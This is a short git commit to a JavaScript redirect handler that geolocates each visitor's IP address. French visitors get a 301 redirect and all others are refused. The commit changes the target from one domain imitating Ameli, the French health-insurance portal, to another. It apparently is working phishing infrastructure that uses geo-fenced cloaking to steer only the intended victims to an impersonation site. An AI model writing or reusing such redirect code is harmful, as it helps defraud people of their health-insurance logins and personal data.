13ea0459f7d57ba17c6f3b942aba553cd350e258
nimorox1 <42836075+nimorox@users.noreply.github.com>
2025-10-13 16:24:28 +0200

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -28,7 +28,7 @@ export default async function handler(req, res) {
     const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
     const geoData = await geoResponse.json();
     if (geoData.status === 'success' && geoData.countryCode === 'FR') {
-      res.redirect(301, 'https://compte-caisse-ameli-en-ligne-portail-assurance-maladie.vercel.app/');
+      res.redirect(301, 'https://www.portail-amelienligne.eu/');
     } else {
       res.status(403).send('Access restricted to France-based IPs only.');
     }
